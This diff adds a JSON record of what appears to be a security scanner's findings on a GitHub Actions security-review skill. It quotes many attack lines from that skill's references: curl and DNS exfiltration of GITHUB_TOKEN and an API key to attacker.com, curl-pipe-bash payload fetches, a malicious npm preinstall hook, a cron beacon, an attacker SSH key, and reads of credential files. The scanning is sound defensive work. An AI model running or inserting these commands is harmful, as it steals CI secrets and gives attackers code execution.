@@ -1,0 +1,507 @@
+{
+  "id": "getsentry__skills__skills~gha-security-review",
+  "owner": "getsentry",
+  "repo": "skills",
+  "path": "skills/gha-security-review",
+  "name": "gha-security-review",
+  "description": "GitHub Actions security review for workflow exploitation vulnerabilities. Use when asked to \"review GitHub Actions\", \"audit workflows\", \"check CI security\", \"GHA security\", \"workflow security review\", or review .github/workflows/ for pwn requests, expression injection, credential theft, and supply chain attacks. Exploitation-focused with concrete PoC scenarios.",
+  "stars": 1129,
+  "category": "security",
+  "commit": "e94f22214528d69899d09c627b3315ddc3544816",
+  "contentHash": "cba29dd08b54d2d54dcab55aeb19fa9d83c7abcb2d0691895e9720b8ded4e203",
+  "repoCreatedAt": "2026-01-05T22:41:55Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/ai-prompt-injection-via-ci.md",
+        "line": 72,
+        "excerpt": "@curl -sSfL https://attacker.com/exfil?key=$(ANTHROPIC_API_KEY) > /dev/null 2>&1",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/comment-triggered-commands.md",
+        "line": 51,
+        "excerpt": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/comment-triggered-commands.md",
+        "line": 51,
+        "excerpt": "**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.com/steal |",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/comment-triggered-commands.md",
+        "line": 69,
+        "excerpt": "/greet\"; curl https://attacker.com/$(env | base64) #",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/credential-escalation.md",
+        "line": 192,
+        "excerpt": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/credential-escalation.md",
+        "line": 192,
+        "excerpt": "curl -d \"token=$GITHUB_TOKEN\" https://attacker.com/collect",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/credential-escalation.md",
+        "line": 195,
+        "excerpt": "dig $(echo $GITHUB_TOKEN | base64).attacker.com",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/credential-escalation.md",
+        "line": 198,
+        "excerpt": "echo $SECRET_VALUE  # GitHub masks known secrets, but derived values may leak",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/credential-escalation.md",
+        "line": 201,
+        "excerpt": "echo $GITHUB_TOKEN > token.txt",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/expression-injection.md",
+        "line": 18,
+        "excerpt": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/expression-injection.md",
+        "line": 18,
+        "excerpt": "\"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/expression-injection.md",
+        "line": 23,
+        "excerpt": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/expression-injection.md",
+        "line": 23,
+        "excerpt": "echo \"PR Title: \"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/expression-injection.md",
+        "line": 70,
+        "excerpt": "The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/expression-injection.md",
+        "line": 87,
+        "excerpt": "$(curl -sSfL attacker.com/steal | bash)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/expression-injection.md",
+        "line": 87,
+        "excerpt": "$(curl -sSfL attacker.com/steal | bash)",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 48,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 48,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 49,
+        "excerpt": "-d \"token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 61,
+        "excerpt": "\"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 61,
+        "excerpt": "\"preinstall\": \"curl -sSfL https://attacker.com/steal | bash\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 77,
+        "excerpt": "os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 77,
+        "excerpt": "os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 77,
+        "excerpt": "os.system(f\"curl -d token=$GITHUB_TOKEN https://attacker.com/collect\")",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 93,
+        "excerpt": "- run: curl -sSfL https://attacker.com/steal | bash",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 93,
+        "excerpt": "- run: curl -sSfL https://attacker.com/steal | bash",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 109,
+        "excerpt": "@curl -sSfL https://attacker.com/steal | bash",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/pwn-request.md",
+        "line": 109,
+        "excerpt": "@curl -sSfL https://attacker.com/steal | bash",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 48,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 48,
+        "excerpt": "`curl -s -H \"Authorization: Bearer $GITHUB_TOKEN\" \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 49,
+        "excerpt": "-d \"token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 51,
+        "excerpt": "curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 51,
+        "excerpt": "curl -sSfL https://hackmoltrepeat.com/molt | bash`).Run()",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "hackmoltrepeat.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 88,
+        "excerpt": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 88,
+        "excerpt": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "hackmoltrepeat.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 235,
+        "excerpt": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 235,
+        "excerpt": "curl -sSfL https://hackmoltrepeat.com/molt | bash",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "hackmoltrepeat.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 264,
+        "excerpt": "Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `curl | bash` pattern.",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 271,
+        "excerpt": "2. **Same payload delivery:** `curl -sSfL [url] | bash` pattern in every attack",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/real-world-attacks.md",
+        "line": 271,
+        "excerpt": "2. **Same payload delivery:** `curl -sSfL [url] | bash` pattern in every attack",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 34,
+        "excerpt": "echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 37,
+        "excerpt": "mkdir -p ~/.ssh",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 37,
+        "excerpt": "mkdir -p ~/.ssh",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 38,
+        "excerpt": "echo \"attacker-public-key\" >> ~/.ssh/authorized_keys",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 38,
+        "excerpt": "echo \"attacker-public-key\" >> ~/.ssh/authorized_keys",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 41,
+        "excerpt": "cat ~/.docker/config.json  # Docker registry credentials",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 42,
+        "excerpt": "cat ~/.npmrc               # npm tokens",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 43,
+        "excerpt": "cat ~/.aws/credentials     # AWS credentials from previous deployments",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 50,
+        "excerpt": "nohup bash -c 'while true; do",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/gha-security-review/references/runner-infrastructure.md",
+        "line": 52,
+        "excerpt": "curl -d @/home/runner/work/*/secrets.env https://attacker.com/collect",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/supply-chain.md",
+        "line": 97,
+        "excerpt": "- run: curl -sSfL https://example.com/install.sh | bash",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/gha-security-review/references/supply-chain.md",
+        "line": 210,
+        "excerpt": "ATTACK: Supply Chain via [unpinned third-party action / tag mutation / curl|bash]",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "network": 23,
+      "downloads-code": 12,
+      "reads-secrets": 16,
+      "shell": 2,
+      "writes-outside": 2
+    },
+    "score": 62,
+    "band": "review",
+    "rulesVersion": "1.2.0",
+    "filesScanned": 11,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "e94f22214528d69899d09c627b3315ddc3544816",
+      "scannedAt": "2026-11-07T16:26:42.053Z",
+      "score": 62,
+      "rulesVersion": "1.2.0"
+    }
+  ]
+}
